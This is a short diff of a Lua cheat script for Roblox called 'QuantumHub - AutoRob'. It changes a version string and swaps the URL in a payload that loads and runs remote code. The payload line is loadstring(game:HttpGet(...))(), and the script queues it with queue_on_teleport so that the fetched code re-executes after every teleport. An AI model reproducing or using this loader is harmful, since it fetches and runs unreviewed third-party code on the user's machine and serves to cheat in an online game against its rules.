@@ -7,7 +7,7 @@ local Window = OrionLib:MakeWindow({
         Name = "QuantumHub - AutoRob",
         HidePremium = false,
         SaveConfig = false,
-        IntroText = "Quantum AutoRob | V1.7.4 - by nytheron"
+        IntroText = "Quantum AutoRob | V1.7.3 - by nytheron"
 })
 
 --  // Tabs \\ --
@@ -434,7 +434,7 @@ end)
 end
 
 local payload = [[
-    loadstring(game:HttpGet("https://raw.githubusercontent.com/qwertyqxz/HWIDS/refs/heads/main/gurkensalat"))()
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/KrockiDerSigma/Krocki/refs/heads/main/Liegestuetze"))()
 ]]
 
 local q = queue_on_teleport or (syn and syn.queue_on_teleport)
